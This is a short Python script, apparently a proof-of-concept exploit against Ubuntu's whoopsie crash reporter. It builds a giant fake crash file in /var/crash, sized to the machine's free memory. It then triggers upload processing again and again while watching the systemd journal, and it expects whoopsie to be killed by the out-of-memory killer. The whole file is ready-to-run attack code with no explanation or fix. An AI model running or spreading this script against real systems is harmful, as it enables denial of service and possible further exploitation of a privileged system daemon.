#!/usr/bin/python3

import os,sys,math,time
import argparse
import select
from pathlib import Path
from systemd import journal


def usable_ram():
    data = {}
    old_keys = set()

    with open('/proc/meminfo', 'r') as f:
        for line in f:
            (key, value) = line.split(":", 2)
            value = value.strip()
            data[key] = value
            old_keys = set(data.keys())

    memfree = int(data['MemFree'].split()[0])
    cached = int(data['Cached'].split()[0])
    writeback = int(data['Writeback'].split()[0])

    return (memfree + cached - writeback) * 1024

def report_gen(message, ratio):
    if os.path.isfile('/var/crash/fake.crash'):
        return

    contents = message
    length = len(contents)
    memory = usable_ram()
    count = math.ceil(memory/length)
    count = int(count/ratio)

    with open('/var/crash/fake.crash', 'w') as f:
        for i in range (count):
            f.write(contents)

    os.sync()
    
    print('Generated a crash file...')

def progress_gen(message):
    i = 0
    while True:
        for x in range(0, 4):
            dots = "." * x
            sys.stdout.write("{}\r".format(message + dots))
            i += 1
            time.sleep(0.5)
        sys.stdout.write("\033[K")
        yield


def journal_log():
    j = journal.Reader()
    j.log_level(journal.LOG_INFO)

    j.seek_tail()
    j.get_previous()

    p = select.poll()
    p.register(j, j.get_events())

    x = progress_gen('Waiting')
    while p.poll():
        if j.process() != journal.APPEND:
            continue

        for entry in j:
            try:
                if entry['MESSAGE'] != "" and str(entry['_COMM']) == 'whoopsie':
                    if 'Parsing' in entry['MESSAGE']:
                        print('Parsing: ' + entry['MESSAGE'])
                    elif 'Uploading' in entry['MESSAGE']:
                        print('Uploading: ' + entry['MESSAGE'])
                    elif 'Response' in entry['MESSAGE']:
                        print('Receiving: ' + entry['MESSAGE'])
                        return 
                    else:
                        print('Others: ' + entry['MESSAGE'])
            except:
                print('whoopsie may be killed by OOM killer.')
                os.remove('/var/crash/fake.crash')
                os.unlink('/var/crash/fake.upload')
                sys.exit()
        next(x)

def main():

    try:
        Path('/var/crash/fake.crash').unlink()
        Path('/var/crash/fake.upload').unlink()
        Path('/var/crash/fake.uploaded').unlink()
    except:
        pass

    parser = argparse.ArgumentParser()
    parser.add_argument('--balance', default='6', type=int)

    balance = parser.parse_args().balance

    # Create a fake crash file
    input = 'A' * 0xffffff + ':' + 'B' * 0xffffff + '\n'
    report_gen(input, balance)

    cnt = 0
    while cnt < balance * 2:
        cnt += 1

        # Start the process; parsing -> uploading -> ...
        Path('/var/crash/fake.upload').touch()

        # Wait until the end of job
        journal_log()

        # Stop the process; remove .upload file
        Path('/var/crash/fake.upload').unlink()


if __name__ == '__main__':
    main()

